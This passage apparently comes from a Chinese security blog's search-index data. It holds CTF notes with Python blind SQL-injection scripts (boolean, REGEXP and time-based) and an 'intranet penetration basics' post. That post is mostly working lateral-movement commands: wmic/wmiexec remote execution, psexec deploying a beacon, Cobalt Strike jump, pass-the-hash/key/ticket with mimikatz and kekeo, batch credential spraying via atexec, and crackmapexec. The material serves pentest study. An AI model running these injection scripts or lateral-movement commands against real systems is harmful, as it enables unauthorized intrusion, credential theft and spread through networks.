&#125;</span><br><span class=\"line\">        a &#x3D; requests.post(url,data&#x3D;paylaod).text</span><br><span class=\"line\">        if &quot;ID:724&quot; in a:</span><br><span class=\"line\">            left &#x3D; mid + 1</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            right &#x3D; mid</span><br><span class=\"line\">    flag &#x3D; chr(right) + flag</span><br><span class=\"line\">    print(flag)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"REGEXP盲注\"><a href=\"#REGEXP盲注\" class=\"headerlink\" title=\"REGEXP盲注\"></a>REGEXP盲注</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import string</span><br><span class=\"line\"></span><br><span class=\"line\">strs &#x3D; string.printable</span><br><span class=\"line\">url &#x3D; &quot;http:&#x2F;&#x2F;x.x.x.x:8001&#x2F;Less-8&#x2F;index.php?id&#x3D;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">database1 &#x3D; &quot;&#39; or database() regexp &#39;^&#123;&#125;&#39;--+&quot;</span><br><span class=\"line\">table1 &#x3D; &quot;&#39; or (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) regexp &#39;^&#123;&#125;&#39;--+&quot;</span><br><span class=\"line\">cloumn1 &#x3D; &quot;&#39; or (select column_name from information_schema.columns where table_name&#x3D;\\&quot;users\\&quot; and table_schema&#x3D;database() limit 1,1) regexp &#39;^&#123;&#125;&#39;--+&quot;</span><br><span class=\"line\">data1 &#x3D; &quot;&#39; or (select username from users limit 0,1) regexp &#39;^&#123;&#125;&#39;--+&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; database1</span><br><span class=\"line\">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class=\"line\">    name &#x3D; &#39;&#39;</span><br><span class=\"line\">    for i in range(1,40):</span><br><span class=\"line\">        char &#x3D; &#39;&#39;</span><br><span class=\"line\">        for j in strs:</span><br><span class=\"line\">            payloads &#x3D; payload.format(name+j)</span><br><span class=\"line\">            urls &#x3D; url+payloads</span><br><span class=\"line\">            r &#x3D; requests.get(urls)</span><br><span class=\"line\">            if &quot;You are in&quot; in r.text:</span><br><span class=\"line\">                name +&#x3D; j</span><br><span class=\"line\">                print(j,end&#x3D;&#39;&#39;)</span><br><span class=\"line\">                char &#x3D; j</span><br><span class=\"line\">                break</span><br><span class=\"line\">        if char &#x3D;&#x3D;&#39;#&#39;:</span><br><span class=\"line\">            break</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"延时注入\"><a href=\"#延时注入\" class=\"headerlink\" title=\"延时注入\"></a>延时注入</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import time</span><br><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">url &#x3D; &quot;http:&#x2F;&#x2F;f2b0d8e1-e12f-446c-a90e-bc79e2c0a062.node4.buuoj.cn:81&#x2F;index.php&quot;</span><br><span class=\"line\">asc &#x3D; &#39;Dabcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-_&#39;</span><br><span class=\"line\">flag &#x3D; &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(50):</span><br><span class=\"line\">    for j in asc:</span><br><span class=\"line\">        #payload &#x3D; &quot;&#39;or(if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flaggg&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;,benchmark(1000000,md5(1)),0))or&#39;&quot;</span><br><span class=\"line\">        payload &#x3D; &quot;&#39;or(if(ascii(mid((select(cmd)from(flaggg)),&#123;&#125;,1))&#x3D;&#123;&#125;,benchmark(2000000,md5(1)),0))or&#39;&quot;</span><br><span class=\"line\">        data &#x3D; &#123;&quot;username&quot;: payload.format(i, ord(j)),&quot;password&quot;: &quot;test&quot;&#125;</span><br><span class=\"line\">        start_time2&#x3D;time.time()</span><br><span class=\"line\">        res &#x3D; requests.post(url, data&#x3D;data)</span><br><span class=\"line\">        end_time2&#x3D;time.time()</span><br><span class=\"line\">        sec2&#x3D;(end_time2-start_time2)</span><br><span class=\"line\">        if sec2 &gt;&#x3D;0.4</span><br><span class=\"line\">            flag +&#x3D; j</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            time.sleep(0.3)</span><br><span class=\"line\">            break</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            pass</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#sys.schema_table_statistics </span><br><span class=\"line\">#sys.x$statement_analysis Fl49ish3re.f1aG123</span><br><span class=\"line\"></span><br><span class=\"line\">import requests</span><br><span class=\"line\">flag&#x3D;&#39;&#39;</span><br><span class=\"line\">for a in range(1,9999):</span><br><span class=\"line\">    print(a)</span><br><span class=\"line\">    for i in range(30,130):</span><br><span class=\"line\">        payload&#x3D;(&quot;&#39; or if((select STRCMP(hex(right((select (f1aG123) from Fl49ish3re),&quot;+str(a)+&quot;)),&#39;&quot;+str(hex(i))[2:]+flag+&quot;&#39;)),1,benchmark(9999999,md5(&#39;test&#39;)))#&quot;).replace(&quot; &quot;,&quot;&#x2F;**&#x2F;&quot;)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            #UPDATE &#96;Fl49ish3re&#96; SET &#96;f1aG123&#96; &#x3D; ? WHERE &#96;f1aG123&#96; &#x3D; ?</span><br><span class=\"line\">            #Fl49ish3re</span><br><span class=\"line\">            #users,Fl49ish3re</span><br><span class=\"line\">            r&#x3D;requests.post(url&#x3D;&quot;&lt;http:&#x2F;&#x2F;172.52.31.84&#x2F;index.php&quot;,data&#x3D;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&gt;&quot;:payload&#125;,timeout&#x3D;1)</span><br><span class=\"line\">            #print(r.text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            flag&#x3D;str(hex(i))[2:]+flag</span><br><span class=\"line\">            print(payload)</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            break</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/\">Sql注入备忘录</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5505\">https://xz.aliyun.com/t/5505</a></p>\n<p><a href=\"https://k1te.cn/2021/05/19/no-column-sql-injection/\">ctf无列名注入小结</a></p>\n","categories":["速查"]},{"title":"内网渗透基础","url":"/2024/08/08/nei-wang-shen-tou-ji-chu/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/202304041241136.png\" alt=\"202304041241136\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"内网\"><a href=\"#内网\" class=\"headerlink\" title=\"内网\"></a>内网</h1><p>内网指的是内部局域网，常说的 LAN（local area network）。常见家庭 wifi 网络和小型的企业网络，通常内部计算机直接访问路由器设备，路由器设备接入移动电信的光纤实现上网。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1.png\"></p>\n<p>内部局域网可以通过交换机 / 防火墙组成多个网络（局域），多个局域之间进行访问控制。新概念（安全域）。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/2.png\"></p>\n<p>如专门存放服务器的统称为 DMZ（非军事化区域），运维区，内网办公区等，常说的内网渗透就是在局域网内部渗透，<strong>内网渗透比较有难度的是域渗透</strong>。</p>\n<h1 id=\"KB2871997-amp-KB2928120\"><a href=\"#KB2871997-amp-KB2928120\" class=\"headerlink\" title=\"KB2871997 &amp; KB2928120\"></a>KB2871997 &amp; KB2928120</h1><p>微软在 2014 年发布了 <code>KB2871997</code> 和 <code>KB2928120</code> 两个补丁，用来阻止域内主机本地用户的网络登录，这样就无法以本地管理员的权限执行 <code>wmi、psexec、schtasks、at和文件访问共享</code>，本地用户的 PTH 方式已经死掉，然而默认的 Administrator（SID 500）这个账户仍可以进行 PTH，并且在禁用 NTLM 的情况下，psexec 无法进行远程连接，但是使用 mimikatz 可以攻击成功。</p>\n<h1 id=\"UNC路径\"><a href=\"#UNC路径\" class=\"headerlink\" title=\"UNC路径\"></a>UNC路径</h1><p>UNC 路径代表 <code>通用命名约定</code> 路径（Universal Naming Convention），它是一种网络路径格式，用于标识在网络上共享的资源位置。UNC 路径允许您在本地网络中访问远程共享。</p>\n<p>UNC 路径由两个反斜杠 <code>\\</code>，后跟远程计算机的名称或 IP 地址、可选的共享名称、可选的路径和文件名组成。例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\\\ComputerName\\ShareName\\Path\\FileName</span><br></pre></td></tr></table></figure>\n\n<p>其中 ComputerName 是远程计算机的名称或 IP 地址，ShareName 是共享名称，在访问共享时需要使用该名称，Path 是共享文件夹中的路径，FileName 是所需文件的名称。</p>\n<h1 id=\"WMI\"><a href=\"#WMI\" class=\"headerlink\" title=\"WMI\"></a>WMI</h1><p>WMI（Windows management instrumentation）可以描述为管理 Windows 系统的方法和功能，我们可以把它当作 API 来与 Win 系统进行相互交流，WMI 在渗透测试中的价值在于它不需要下载和安装，WMI 是 Windows 系统自带功能。而且整个运行过程都在计算机内存中发生，不会留下任何痕迹。</p>\n<h2 id=\"135端口\"><a href=\"#135端口\" class=\"headerlink\" title=\"135端口\"></a>135端口</h2><p>RPC：远程过程调用服务，WMIC（winsows management instrumentation）用到这个端口。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/3.png\"></p>\n<p>wmic 具体用法如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 打开一个计算器</span><br><span class=\"line\">wmic &#x2F;node:ip &#x2F;user:用户名 &#x2F;password:密码 PROCESS call create &quot;calc.exe&quot; </span><br><span class=\"line\"></span><br><span class=\"line\">#无回显</span><br><span class=\"line\">wmic &#x2F;node:192.168.1.56 &#x2F;user:administrator &#x2F;password:aab+1s PROCESS call create &quot;calc.exe&quot;</span><br><span class=\"line\">wmic &#x2F;node:192.168.1.56 &#x2F;user:administrator &#x2F;password:aab+1s process call create &quot;cmd.exe &#x2F;c ipconfig &gt;C:\\1.txt&quot;</span><br></pre></td></tr></table></figure>\n\n<p>连接报错如下信息：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/4.png\"></p>\n<p>ip 错了报如下信息：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/5.png\"></p>\n<p>密码填错报如下信息：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/6.png\"></p>\n<p>用另一台计算机尝试连接，正常访问，命令执行成功，wmic 执行后无回显，需写入到文本文件中。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/7.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/8.png\"></p>\n<h2 id=\"WMIEXEC\"><a href=\"#WMIEXEC\" class=\"headerlink\" title=\"WMIEXEC\"></a>WMIEXEC</h2><p>获取交互式 shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.1.56 administrator aab+1s</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/9.png\"></p>\n<p>执行单条命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;cmd 192.168.1.56 administrator aab+1s &quot;cmdkey &#x2F;list&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10.png\"></p>\n<p>如上是提供了密码，如无密码，可以利用 wce 的 hash 注入，然后执行 wmiexec 就可以了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wce –s 账号:主机名或域的名字:LM:NTLM</span><br><span class=\"line\"></span><br><span class=\"line\">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.0.1</span><br></pre></td></tr></table></figure>\n\n<p>如果抓取的 LM hash 是 AAD3 开头的，或者是 No Password 之类的，计用 32 个 0 代替 LM hash</p>\n<h2 id=\"wmiexec-exe\"><a href=\"#wmiexec-exe\" class=\"headerlink\" title=\"wmiexec.exe\"></a>wmiexec.exe</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wmiexec.exe .&#x2F;administrator:aab+1s@192.168.1.56 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/11.png\"></p>\n<p>hash 传递</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wmiexec.exe -hashes 00000000000000000000000000000000:04cea78fa35a5be51f4aee6375651e8a WIN-P6KD23KACIJ&#x2F;Administrator@192.168.10.173 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://github.com/rootclay/WMIHACKER/blob/master/README_zh.md\">https://github.com/rootclay/WMIHACKER/blob/master/README_zh.md</a></p>\n<h1 id=\"137，138，139端口\"><a href=\"#137，138，139端口\" class=\"headerlink\" title=\"137，138，139端口\"></a>137，138，139端口</h1><p>137、138 为 UDP 端口，主要用于内网传输文件，NetBios/SMB 服务的获取主要是通过 139 端口。</p>\n<h1 id=\"445端口\"><a href=\"#445端口\" class=\"headerlink\" title=\"445端口\"></a>445端口</h1><p>共享文件夹、共享打印机</p>\n<h2 id=\"ipc\"><a href=\"#ipc\" class=\"headerlink\" title=\"ipc$\"></a>ipc$</h2><p><code>IPC$ </code>是共享 “命名管道” 的资源，为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问，从 NT/2000 开始使用。</p>\n<p>IPC$ 在同一时间内，两个 IP 之间只允许建立一个连接。</p>\n<p>NT/2000 在提供了 ipc$ 功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享 ( c$, d$ , e$……) 和系统目录 winnt 或管理员目录 (admin$) 共享。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.1.56\\c$ &quot;password&quot; &#x2F;user:&quot;domain\\username&quot;</span><br><span class=\"line\">net use \\\\192.168.1.56\\c$ &quot;aab+1s&quot; &#x2F;user:administrator</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/12.png\"></p>\n<p>另一台主机 net use 远程连接</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/13.png\"></p>\n<h2 id=\"扩展语法\"><a href=\"#扩展语法\" class=\"headerlink\" title=\"扩展语法\"></a>扩展语法</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.1.56\\c$</span><br><span class=\"line\"></span><br><span class=\"line\"># 删除ipc$连接</span><br><span class=\"line\">net use \\\\192.168.1.56\\ipc$ &#x2F;del</span><br><span class=\"line\"></span><br><span class=\"line\"># 将目标磁盘映射到本地</span><br><span class=\"line\">net use z: \\\\192.168.1.56\\c$</span><br><span class=\"line\"></span><br><span class=\"line\"># 删除映射</span><br><span class=\"line\">net use z: &#x2F;del</span><br><span class=\"line\"></span><br><span class=\"line\"># 关闭共享</span><br><span class=\"line\">net use ipc$ &#x2F;del</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://yoga7xm.top/2019/03/24/IPentest-base/#IPC-%E7%A9%BA%E8%BF%9E%E6%8E%A5\">ipc$空连接</a></p>\n<h1 id=\"横向渗透-SMB-445-端口\"><a href=\"#横向渗透-SMB-445-端口\" class=\"headerlink\" title=\"横向渗透 SMB(445 端口)\"></a>横向渗透 SMB(445 端口)</h1><p>利用 SMB 服务，需要先建立 IPC，可以通过 hash 传递来远程执行，默认回来 System 权限，需要目标防火墙开启 445 并允许通过。</p>\n<h2 id=\"psexec\"><a href=\"#psexec\" class=\"headerlink\" title=\"psexec\"></a>psexec</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.1.56\\c$ &quot;aab+1s&quot; &#x2F;user:administrator</span><br><span class=\"line\"></span><br><span class=\"line\">PsExec.exe \\\\192.168.1.56 whoami</span><br><span class=\"line\"></span><br><span class=\"line\">.\\PsExec.exe -u administrator -p 123456 \\\\dc01 cmd</span><br><span class=\"line\"></span><br><span class=\"line\"># 交互式shell（相同凭证可直接登录）</span><br><span class=\"line\">psexec -accepteula \\\\ip -s cmd.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/14.png\"></p>\n<p>执行原理</p>\n<ol>\n<li>通过 <code>ipc$</code> 连接，释放 <code>psexecsvc.exe</code> 到目标</li>\n<li>通过服务管理 <code>SCManager</code> 远程创建 <code>psexecsvc</code> 服务，并启动服务。</li>\n<li>客户端连接执行命令，服务端启动相应的程序并执行回显数据。</li>\n<li>运行完后删除服务。这个在 windows 的日志中有详细的记录，另外 psexec 在少数情况下会出现服务没删除成功的 bug，所以一般不推荐使用 psexec，推荐 wmiexec</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\WINDOWS\\Temp\\PsExec.exe -accepteula \\\\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\\WINDOWS\\Temp\\beacon.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/15.png\"></p>\n<h2 id=\"cs-plugins\"><a href=\"#cs-plugins\" class=\"headerlink\" title=\"cs - plugins\"></a>cs - plugins</h2><p>选中需横向的主机，jump-psexec64</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/16.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/17.png\"></p>\n<p>选择一个认证，listen 如果可出网，选择 1，内网横向则用 smb beacon2。</p>\n<p>直接使用命令行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">jump [module] [target] [listener]</span><br><span class=\"line\">jump psexec64 192.168.10.173 local</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/18.png\"></p>\n<p>通过 psexec 横向到目标机器，凭证用的是已知凭证去碰撞</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/19.png\"></p>\n<p>此时整体拓扑如下，是父子关系，这是因为用的是 http beacon 直接连接 teamserver，如果用 smb beacon 就是 link 关系。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20.png\"></p>\n<p>换一下 smb beacon</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/21.png\"></p>\n<p>主机 ip 后面带有四个圆圈。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/22.png\"></p>\n<p>smb 的箭头是黄色</p>\n<p><a href=\"https://www.cnblogs.com/sup3rman/p/12381874.html\">https://www.cnblogs.com/sup3rman/p/12381874.html</a></p>\n<h1 id=\"SMBEXEC\"><a href=\"#SMBEXEC\" class=\"headerlink\" title=\"SMBEXEC\"></a>SMBEXEC</h1><p><strong>明文传递</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">smbexec.exe administrator:aab+1s@192.168.10.173</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/23.png\"></p>\n<p><strong>hash传递</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hash传递：</span><br><span class=\"line\">smbexec -hashes :$HASH$ admin@192.168.10.173</span><br><span class=\"line\">smbeexec -hashes :$HASH$ domain&#x2F;admin@192.168.10.173</span><br></pre></td></tr></table></figure>\n\n<p>dump hash</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/24.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/25.png\"></p>\n<h1 id=\"atexec\"><a href=\"#atexec\" class=\"headerlink\" title=\"atexec\"></a>atexec</h1><p>批量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">FOR &#x2F;F %%i in (ips.txt) do net use \\\\%%i\\ipc$ &quot;admin!@#45&quot; &#x2F;user:administrator #批量检测 IP 对应明文 连接 </span><br><span class=\"line\"></span><br><span class=\"line\">FOR &#x2F;F %%i in (ips.txt) do atexec.exe .&#x2F;administrator:admin!@#45@%%i whoami #批量检测 IP 对应明文 回显版 </span><br><span class=\"line\"></span><br><span class=\"line\">FOR &#x2F;F %%i in (pass.txt) do atexec.exe .&#x2F;administrator:%%i@192.168.3.21 whoami #批量检测明文对应 IP 回显版 </span><br><span class=\"line\"></span><br><span class=\"line\">FOR &#x2F;F %%i in (hash.txt) do atexec.exe -hashes :%%i .&#x2F;administrator@192.168.3.21 whoami #批量检测 HASH 对应 IP 回显版</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"PTH\"><a href=\"#PTH\" class=\"headerlink\" title=\"PTH\"></a>PTH</h1><p>域 / 工作组环境，内存中存在和当前机器相同的密码，在身份验证过程中，基本过程是从用户那里收集密码，然后对其进行加密，然后将正确密码的加密哈希用于将来的身份验证。</p>\n<p>初次认证后，Windows 将哈希值保存在内存中，这样用户就不必一次又一次地输入密码。</p>\n<p>在凭证转储期间，我们看到我们已经提取了大量的哈希值。现在作为攻击者，我们不知道密码。因此，在身份验证期间，我们提供哈希而不是密码。</p>\n<p>Windows 比较哈希值并热烈欢迎攻击者。简而言之，这就是 Pass-the-Hash 攻击。</p>\n<p><a href=\"https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/\">https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/</a></p>\n<h2 id=\"mimikatz-PTH\"><a href=\"#mimikatz-PTH\" class=\"headerlink\" title=\"mimikatz - PTH\"></a>mimikatz - PTH</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">privilege::debug </span><br><span class=\"line\">sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:WIN-P6KD23KACIJ &#x2F;ntlm:04cea78fa35a5be51f4aee6375651e8a</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/26.png\"></p>\n<p>弹出窗口后，连接共享端口，传输文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\">sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:WIN-P6KD23KACIJ &#x2F;ntlm:04cea78fa35a5be51f4aee6375651e8a</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/27.png\"></p>\n<p>拷贝文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/28.png\"></p>\n<p>参考：</p>\n<p><a href=\"https://yoga7xm.top/2019/04/12/IPentest-domain3/\">内网渗透–Hash 传递攻击</a></p>\n<h1 id=\"PTK\"><a href=\"#PTK\" class=\"headerlink\" title=\"PTK\"></a>PTK</h1><p>需要存在补丁 kb2871997</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">使用minikatz获取aes256_hmac：</span><br><span class=\"line\">sekurlsa::ekeys</span><br><span class=\"line\">传递连接：sekurlsa::pth &#x2F;user:mary&#x2F;domain:hsyy.com&#x2F;aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b </span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"PTT\"><a href=\"#PTT\" class=\"headerlink\" title=\"PTT\"></a>PTT</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">实现步骤：  </span><br><span class=\"line\">1、生成票据 kekeo “tgt::ask &#x2F;user:mary &#x2F;domain:hsyy.com &#x2F;ntlm:518b98ad4178a53695dc997aa02d455c”  </span><br><span class=\"line\">2、导入票据 kerberos::ptt [TGT_haha@HSYY.COM_krbtgt](mailto:TGT_haha@HSYY.COM_krbtgt)~hsyy.com@GOD.ORG.kirbi  </span><br><span class=\"line\">3、查看凭证 klist  </span><br><span class=\"line\">4、利用 net use 载入 dir \\192.168.213.163\\c$  </span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"smbclient\"><a href=\"#smbclient\" class=\"headerlink\" title=\"smbclient\"></a>smbclient</h1><h2 id=\"认证登录\"><a href=\"#认证登录\" class=\"headerlink\" title=\"认证登录\"></a>认证登录</h2><ul>\n<li>明文</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">smbclient -L &#x2F;&#x2F;192.168.10.173 -U Administrator</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>hash</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">smbclient.exe -hashes 00000000000000000000000000000000:04cea78fa35a5be51f4aee6375651e8a WIN-P6KD23KACIJ&#x2F;Administrator@192.168.10.173</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/29.png\"></p>\n<h2 id=\"空会话枚举\"><a href=\"#空会话枚举\" class=\"headerlink\" title=\"空会话枚举\"></a>空会话枚举</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">smbclient -N -U &quot;&quot; -L \\\\192.168.1.214</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"rpcclient\"><a href=\"#rpcclient\" class=\"headerlink\" title=\"rpcclient\"></a>rpcclient</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># rpcclient -U &quot;&quot; -N 10.10.10.161 </span><br><span class=\"line\">rpcclient $&gt;enumdomusers</span><br><span class=\"line\"></span><br><span class=\"line\"># rpcclient -U corp.pentest.lab&#x2F;administrator 10.10.10.161 </span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"crackmapexec\"><a href=\"#crackmapexec\" class=\"headerlink\" title=\"crackmapexec\"></a>crackmapexec</h1><p><a href=\"https://mpgn.gitbook.io/crackmapexec/getting-started/installation/installation-on-windows\">https://mpgn.gitbook.io/crackmapexec/getting-started/installation/installation-on-windows</a></p>\n<h2 id=\"执行命令\"><a href=\"#执行命令\" class=\"headerlink\" title=\"执行命令\"></a>执行命令</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">crackmapexec smb 192.168.10.173 -u administrator -H 04cea78fa35a5be51f4aee6375651e8a -x ipconfig</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/30.png\"></p>\n<p>powershell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">crackmapexec 192.168.10.11 -u Administrator -p &#39;P@ssw0rd&#39; -X &#39;$PSVersionTable&#39;</span><br></pre></td></tr></table></figure>\n\n<p>bypass ASMI</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span 